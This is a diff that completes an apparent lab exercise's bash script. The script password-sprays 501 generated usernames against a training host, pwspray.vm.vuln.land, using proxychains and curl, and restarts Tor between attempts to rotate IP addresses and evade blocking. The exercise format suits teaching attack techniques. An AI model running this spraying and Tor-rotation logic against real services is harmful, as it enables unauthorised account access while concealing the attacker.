@@ -8,7 +8,8 @@ for user in {0..500}; do # iterate through all 501 possible usernames
         echo "Restarting Tor service and sleeping for 5 seconds"
 
         # ADD CODE HERE to restart tor, then sleep for 5 seconds
-
+		sudo systemctl restart tor
+        sleep 5
     fi
     user_expanded=$(printf "%03d" $user) # add leading 0s to user (e.g., 25 => 025)
     candidate="$user_prefix$user_expanded:$password" # create the next username-password candidate
@@ -16,5 +17,10 @@ for user in {0..500}; do # iterate through all 501 possible usernames
 
     # ADD CODE HERE to try to login with candidate and check whether login was successful.
     # If successful, echo the candidate and exit.
-
+	if proxychains -q curl -s --include http://pwspray.vm.vuln.land -u "$candidate" | head -n1 | grep 200; then
+        echo "$candidate"
+        exit 0
+	fi
 done
+
+exit 1
